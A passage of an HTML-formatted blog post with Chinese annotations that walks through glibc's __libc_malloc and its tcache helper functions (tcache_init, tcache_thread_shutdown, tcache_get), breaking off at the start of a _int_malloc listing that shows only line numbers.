class="hljs-comment">// arena</span><br>    <span class="hljs-type">void</span> *victim; <span class="hljs-comment">// 所返回的堆块</span><br><br>    <span class="hljs-comment">// 读取 __malloc_hook 钩子, 如果有值，则运行钩子函数并返回</span><br>    <span class="hljs-type">void</span> *(*hook)(<span class="hljs-type">size_t</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read(__malloc_hook);<br>    <span class="hljs-keyword">if</span> (__builtin_expect(hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>        <span class="hljs-keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br><br>    <span class="hljs-comment">// 使用 tchache 的情况</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>    <span class="hljs-comment">/* int_free also calls request2size, be careful to not pad twice.  */</span><br>    <span class="hljs-type">size_t</span> tbytes;<br><br>    <span class="hljs-comment">// 判断请求分配字节的大小</span><br>    <span class="hljs-comment">// 计算 bytes 数据需要分配的内存大小，当 bytes 数据的大小比最小 chunk 要还小时,</span><br>    <span class="hljs-comment">// 按最小 chunk 的大小分配；当 bytes 数据的大小比最小 chunk 大时，则分配满足内存</span><br>    <span class="hljs-comment">// bytes最大不超过(unsigned long) (INTERNAL_SIZE_T) (-2 * MINSIZE)</span><br>    checked_request2size (bytes, tbytes);<br>    <span class="hljs-comment">// 计算 tbytes 大小所对应的 tcache 下标</span><br>    <span class="hljs-type">size_t</span> tc_idx = csize2tidx (tbytes);<br>    <span class="hljs-comment">// 如果 tcache 还没有被创建，则调用 tcache_init() 初始化 tcache</span><br>    MAYBE_INIT_TCACHE ();<br><br>    DIAG_PUSH_NEEDS_COMMENT;<br><br>    <span class="hljs-comment">// 如果 tc_idx 在 tcache bins 的范围内</span><br>    <span class="hljs-comment">// 且 tcache 存在</span><br>    <span class="hljs-comment">// 且 tc_idx 对应的 entry 不为空 即 有空闲的 tcache chunk</span><br>    <span class="hljs-keyword">if</span> (tc_idx &lt; mp_.tcache_bins<br>        <span class="hljs-comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="hljs-comment">/* to appease gcc */</span><br>        &amp;&amp; tcache<br>        &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="hljs-literal">NULL</span>)<br>      &#123;<br>        <span class="hljs-comment">// 返回相应的 tcache chunk</span><br>        <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>      &#125;<br>    DIAG_POP_NEEDS_COMMENT;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-comment">// 没有启用多线程的情况</span><br>    <span class="hljs-keyword">if</span> (SINGLE_THREAD_P) &#123;<br>        <span class="hljs-comment">// 调用 _int_malloc 获取 chunk</span><br>        victim = _int_malloc(&amp;main_arena, bytes);<br>        <span class="hljs-comment">// 满足以下 3 个条件任意一个即可返回</span><br>        <span class="hljs-comment">// 1. victim 为空</span><br>        <span class="hljs-comment">// 2. victim 是从 mmap 分配的</span><br>        <span class="hljs-comment">// 3. victim 是从主分配区（main_arena）分配的</span><br>        assert(!victim || chunk_is_mmapped (mem2chunk(victim)) ||<br>               &amp;main_arena == arena_for_chunk (mem2chunk(victim)));<br>        <span class="hljs-keyword">return</span> victim;<br>    &#125;<br><br>    <span class="hljs-comment">// 启用多线程的情况</span><br>    <span class="hljs-comment">// 获取当前的 arena</span><br>    arena_get (ar_ptr, bytes);<br><br>    <span class="hljs-comment">// 调用 _int_malloc 获取 chunk</span><br>    victim = _int_malloc(ar_ptr, bytes);<br>    <span class="hljs-comment">/* Retry with another arena only if we were able to find a usable arena</span><br><span class="hljs-comment">       before.  */</span><br>    <span class="hljs-comment">// 如果未成功获取 arena, 或者没有分配 chunk</span><br>    <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>) &#123;<br>        LIBC_PROBE(memory_malloc_retry, <span class="hljs-number">1</span>, bytes);<br>        <span class="hljs-comment">// 再次尝试</span><br>        ar_ptr = arena_get_retry(ar_ptr, bytes);<br>        victim = _int_malloc(ar_ptr, bytes);<br>    &#125;<br><br>    <span class="hljs-comment">// 释放线程锁</span><br>    <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<br>        __libc_lock_unlock(ar_ptr-&gt;mutex);<br><br>    <span class="hljs-comment">// 满足以下 3 个条件任意一个即可返回</span><br>    <span class="hljs-comment">// 1. victim 为空</span><br>    <span class="hljs-comment">// 2. victim 是从 mmap 分配的</span><br>    <span class="hljs-comment">// 3. victim 是从主分配区（main_arena）分配的</span><br>    assert(!victim || chunk_is_mmapped (mem2chunk(victim)) ||<br>           ar_ptr == arena_for_chunk (mem2chunk(victim)));<br>    <span class="hljs-keyword">return</span> victim;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="MAYBE-INIT-TCACHE"><a href="#MAYBE-INIT-TCACHE" class="headerlink" title="MAYBE_INIT_TCACHE"></a>MAYBE_INIT_TCACHE</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>...<br><span class="hljs-type">static</span> __thread <span class="hljs-type">bool</span> tcache_shutting_down = <span class="hljs-literal">false</span>;<br><span class="hljs-type">static</span> __thread tcache_perthread_struct *tcache = <span class="hljs-literal">NULL</span>;<br>...<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> MAYBE_INIT_TCACHE() \</span><br><span class="hljs-meta">  <span class="hljs-keyword">if</span> (__glibc_unlikely (tcache == NULL)) \</span><br><span class="hljs-meta">    tcache_init();</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span>  <span class="hljs-comment">/* !USE_TCACHE */</span></span><br><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> MAYBE_INIT_TCACHE()</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_thread_shutdown</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    <span class="hljs-comment">/* Nothing to do if there is no thread cache.  */</span><br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* !USE_TCACHE  */</span></span><br><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">tcache_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-type">void</span> *victim = <span class="hljs-number">0</span>;<br>  <span class="hljs-comment">// 计算 tcahce_perthread_struct 结构体的大小</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">size_t</span> bytes = <span class="hljs-keyword">sizeof</span> (tcache_perthread_struct);<br><br>  <span class="hljs-comment">// 如果 tcache 被禁用，直接返回</span><br>  <span class="hljs-keyword">if</span> (tcache_shutting_down)<br>    <span class="hljs-keyword">return</span>;<br><br>  <span class="hljs-comment">// 给 tcache 分配相应的内存</span><br>  arena_get (ar_ptr, bytes);<br>  victim = _int_malloc (ar_ptr, bytes);<br>  <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      ar_ptr = arena_get_retry (ar_ptr, bytes);<br>      victim = _int_malloc (ar_ptr, bytes);<br>    &#125;<br><br><br>  <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<br>    __libc_lock_unlock (ar_ptr-&gt;mutex);<br><br>  <span class="hljs-comment">/* In a low memory situation, we may not be able to allocate memory</span><br><span class="hljs-comment">     - in which case, we just keep trying later.  However, we</span><br><span class="hljs-comment">     typically do this very early, so either there is sufficient</span><br><span class="hljs-comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span><br><span class="hljs-comment">     allocations anyway.  */</span><br>  <span class="hljs-keyword">if</span> (victim)<br>    &#123;<br>      <span class="hljs-comment">// 给 tcache 赋值</span><br>      tcache = (tcache_perthread_struct *) victim;<br>      <span class="hljs-comment">// 将 tcache 处的内存初始化为 0</span><br>      <span class="hljs-built_in">memset</span> (tcache, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> (tcache_perthread_struct));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">tcache_thread_shutdown</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">int</span> i;<br>  tcache_perthread_struct *tcache_tmp = tcache;<br>  <span class="hljs-comment">// tcache 不存在直接返回</span><br>  <span class="hljs-keyword">if</span> (!tcache)<br>    <span class="hljs-keyword">return</span>;<br><br>  <span class="hljs-comment">/* Disable the tcache and prevent it from being reinitialized.  */</span><br>  <span class="hljs-comment">// 禁用 tcache 并防止它被重新初始化</span><br>  tcache = <span class="hljs-literal">NULL</span>;<br>  tcache_shutting_down = <span class="hljs-literal">true</span>;<br><br>  <span class="hljs-comment">/* Free all of the entries and the tcache itself back to the arena</span><br><span class="hljs-comment">     heap for coalescing.  */</span><br>  <span class="hljs-comment">// 将所有条目和 tcache 本身释放回 arena 以进行合并</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; TCACHE_MAX_BINS; ++i)<br>    &#123;<br>      <span class="hljs-keyword">while</span> (tcache_tmp-&gt;entries[i])<br>    &#123;<br>      tcache_entry *e = tcache_tmp-&gt;entries[i];<br>      tcache_tmp-&gt;entries[i] = e-&gt;next;<br>      __libc_free (e);<br>    &#125;<br>    &#125;<br><br>  __libc_free (tcache_tmp);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span><br><span class="hljs-comment">   available chunks to remove.  */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> * <span class="hljs-title function_">tcache_get</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  <span class="hljs-comment">// 取出 tc_idx 所对应的链表</span><br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  assert (tcache-&gt;entries[tc_idx] &gt; <span class="hljs-number">0</span>);<br>  <span class="hljs-comment">// 取出第一个</span><br>  tcache-&gt;entries[tc_idx] = e-&gt;next;<br>  <span class="hljs-comment">// 对应的 tcache_count - 1</span><br>  --(tcache-&gt;counts[tc_idx]);<br>  <span class="hljs-comment">// 返回 chunk</span><br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *) e;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br></pre></td><td 